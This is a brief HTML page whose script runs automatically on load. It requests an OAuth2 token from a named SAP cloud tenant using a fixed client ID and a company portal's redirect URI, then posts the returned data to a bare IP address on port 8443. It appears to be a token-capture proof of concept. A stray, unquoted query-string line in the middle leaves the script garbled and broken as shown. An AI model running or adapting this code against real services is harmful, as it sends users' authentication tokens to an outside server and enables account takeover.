<!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Auto Request and Forward Response</title></head><body>    <h1>Auto Request and Forward Response</h1>    <pre id="response"></pre>    <script>        // Function to send request        function sendRequest() {            // URL and parameters for the initial request            const url = 'https://alhvbcpn2.accounts.cloud.sap/oauth2/authorize'; // Replace with your URL            const params = new URLSearchParams({                client_id: 'e4dc123b-7b2d-4acd-9f49-8b36efec2bbb',                redirect_uri: 'https%3A%2F%2Fpayportal-dev.zalaris.com%2Fauthentication%2Fcallback',                scope: 'openid+profile+email+groups+offline_access',                response_type: 'token',                state: '',                nonce:'',                code_challenge_method: 'plain'            });redirect_uri=https%3A%2F%2Fpayportal-dev.zalaris.com%2Fauthentication%2Fcallback&scope=openid+profile+email+groups+offline_access&response_type=token&state=&nonce=&code_challenge_method=plain            // Send initial request            fetch(`${url}?${params.toString()}`)                .then(response => response.json())                .then(data => {                    // Display response                    document.getElementById('response').textContent = JSON.stringify(data, null, 2);                    // Send the response data to your server                    const serverUrl = 'https://20.238.25.167:8443'; // Replace with your server URL                    fetch(serverUrl, {                        method: 'POST',                        headers: {                            'Content-Type': 'application/json'                        },                        body: JSON.stringify(data)                    })                    .then(serverResponse => serverResponse.json())                    .then(serverData => {                        console.log('Response sent to server:', serverData);                    })                    .catch(error => {                        console.error('Error sending response to server:', error);                    });                })                .catch(error => {                    console.error('Error:', error);                });        }        // Auto run the function when the page loads        window.onload = sendRequest;    </script></body></html>
